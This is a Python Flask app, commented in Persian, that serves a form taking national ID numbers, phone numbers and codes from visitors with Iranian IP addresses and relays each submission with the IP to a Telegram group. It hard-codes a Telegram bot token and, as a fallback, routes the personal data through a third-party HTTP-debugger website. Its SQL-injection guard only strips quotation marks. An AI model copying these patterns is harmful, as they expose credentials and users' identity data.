from flask import Flask, render_template, request , jsonify , make_response
import Db
import requests
import jdatetime
from threading import Thread
from pytz import timezone
from random import choice
import datetime

DaysOfWeek = {
    "Saturday":"شنبه","Sunday":"یکشنبه","Monday":"دوشنبه","Tuesday":"سه‌شنبه","Wednesday":"چهارشنبه","Thursday":"پنجشبه","Friday":"جمعه"
}
Months = {
    "1":"فروردین","2":"اردیبهشت","3":"خرداد","4":"تیر","5":"مرداد","6":"شهریور","7":"مهر","8":"آبان","9":"آذر","10":"دی","11":"بهمن","12":"اسفند"
}



def SendMessageToTelegramDirect(Message , ChatID) -> bool:
    try:
        requests.get(f"https://api.telegram.org/bot6744041909:AAE-DQD8TuJpVAWZv0UDKL3_8YAcJetblmU/sendmessage?chat_id={ChatID}&text="
                     +Message , timeout=40)
        return True
    except:
        return False

def SendMessageToTelegramIndirect(Message , ChatID) -> bool:
    settings = {
        "UrlBox": f"https://api.telegram.org/bot6744041909:AAE-DQD8TuJpVAWZv0UDKL3_8YAcJetblmU/sendmessage?chat_id={ChatID}&text="+Message,
        "MethodList": "POST"
    }
    try:
        requests.post(
            "https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx", settings , timeout=40)
        return True
    except:
        return False


app = Flask(__name__ , template_folder=".")


def SendToTelegram(f1 , f2 , f3 , f4 , f5 , visited , submited , id , NCodeCount , ip):
    chatid = "-1001946865397"
    message = f"""
    کاربر شماره: {id}
    آی پی: {ip}
    
    کد اشتراکی دریافتی از ادمین:
    {f1}
    کد ملی:
    {f4}
    شماره تلفن همراه:
    {f5}
    کد انتخاب شده:
    {f2}
    تاریخ و زمان رسید:
    {f3}
    
    """
    if NCodeCount not in ['0', '1']:
        message += f"""
    هشدار کد ملی تکراری 🔵
    کد ملی {NCodeCount} بار وارد‌شده
        """
    if submited > 1:
        message += f"""
        کاربر تکراری هست هشدار🔴
        {visited} بار وارد سایت شده 
        {submited} بار فیلد هارو پر کرده 
        
        """
    now = jdatetime.datetime.now(timezone('Asia/Tehran'))
    day = DaysOfWeek.get(now.strftime("%A")) 
    time = now.strftime("%H:%M")  
    Month = Months.get(now.strftime("%m"))
    DayOfMonth = now.strftime("%d") 
    message += f"{time} {day} {DayOfMonth} {Month}"
    # SendMessageToTelegramDirect(message , "151372864")
    while True:
        if SendMessageToTelegramDirect(message , chatid):
            break
        if SendMessageToTelegramIndirect(message , chatid):
            break

# def ipaddress(request):
#     try:
#         if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
#             ip_addr = request.environ['REMOTE_ADDR']
#         else:
#             ip_addr = request.environ['HTTP_X_FORWARDED_FOR']
#         return ip_addr
#     except Exception as err:
#         print(f"Error getting ipaddress : {err}")

def GenerateSCode():
    r = ""
    for n in range(32):
        r += choice("1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM!@$%_")
    return r

@app.route('/GetCookie', methods=['GET'])
def Cookie_ajax():
    Ip = request.headers.get('CF-Connecting-IP')
    if Ip is None:
        Ip = request.headers.get('X-Forwarded-For')
    User = Db.GetUserByIP(Ip)
    if User is not None:
        return User[4]
    else:
        return "NotFound"
    
@app.route('/', methods=['GET', 'POST'])
def form_page():
    Scode = request.cookies.get('SecretCode')
    # Ip = request.environ.get('HTTP_X_REAL_IP', request.remote_addr) 
    Ip = request.headers.get('CF-Connecting-IP')
    if Ip is None:
        Ip = request.headers.get('X-Forwarded-For')
    CountryByCloudFlare = request.headers.get('Cf-Ipcountry')
    if CountryByCloudFlare is not None:
        IsFromIran = CountryByCloudFlare == "IR"
    else:
        IsFromIran = requests.get(f"https://geolocation-db.com/json/{Ip}&position=true").json().get("country_name") == "Iran"
    # IsFromIran = True  # For Debug
    if not IsFromIran:
        return "<h1>برای استفاده از سرویس فیلترشکن خود را خاموش کنید</h1>\n"+ str(Ip) 
    try:
        data = jsonify(request.json).get_json()
        Scode = Scode.replace('"','') # sql injection
        if request.method == 'POST' and len(Scode) == 32:
            Field1 = data.get('Field1')
            Field2 = data.get('Field2')
            Field3 = data.get('Field3')
            Field4 = data.get('Field4')
            Field5 = data.get('Field5')
            if len(Field1) + len(Field2) + len(Field3) + len(Field4) + len(Field5) > 250:
                return "Block"
            Db.AddOrUpdateToUsers(Ip , Scode , Field4)
            Db.AddOrUpdateToNationalCode(Field4)
            User = Db.GetUserByIP(Ip)
            if User == None:
                User = Db.GetUserByScode(Scode)
            NationalCodeCount = Db.GetNationalSubmitted(Field4)
            Thread(target= lambda:SendToTelegram(Field1,Field2,Field3,Field4,Field5,User[1],User[2],User[0],NationalCodeCount , Ip)).start()
            return "Ok"
    finally:
        resp = make_response(render_template('form.html'))
        user = Db.GetUserByIP(IP=Ip)
        expire_date = datetime.datetime.now()
        expire_date = expire_date + datetime.timedelta(days=400)
        if user is not None:
            Db.onVisitIp(Ip)
            resp.set_cookie("SecretCode",user[4],expires=expire_date)
        elif Db.GetUserByScode(Scode) is None:
            resp.set_cookie("SecretCode",GenerateSCode(),expires=expire_date)
        else:
            Db.onVisitScode(Scode)
        return resp
    


if __name__ == '__main__':
    app.run()
